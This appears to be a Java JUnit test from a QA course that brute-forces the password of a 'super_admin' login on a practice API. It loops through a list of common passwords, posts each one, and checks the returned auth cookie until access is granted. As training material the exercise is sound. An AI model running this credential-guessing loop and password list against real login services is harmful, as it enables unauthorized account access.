import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class SelectionPasswordTest {
    @Test
    public void selection(){
        String[] mostCommonPasswords = {"password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey","access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000","123qwe"};

        for(int i = 0; i <69; i+=1){

            Map<String, String>  selectionPass = new HashMap<>();
            selectionPass.put("login", "super_admin");
            selectionPass.put("password", mostCommonPasswords[i]);

            Response authorize = RestAssured
                    .given()
                    .body(selectionPass)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String authCookie = authorize.getCookie("auth_cookie");

            Response checkCookie = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            //checkCookie.print();
            String checkResult = checkCookie.body().asString();

            if(checkResult.equals("You are NOT authorized"))System.out.println(mostCommonPasswords[i] + " - fail");
            else{
                System.out.println("\nPassword found!!! - " + mostCommonPasswords[i] + "\n");
                break;
            }
       }

    }
}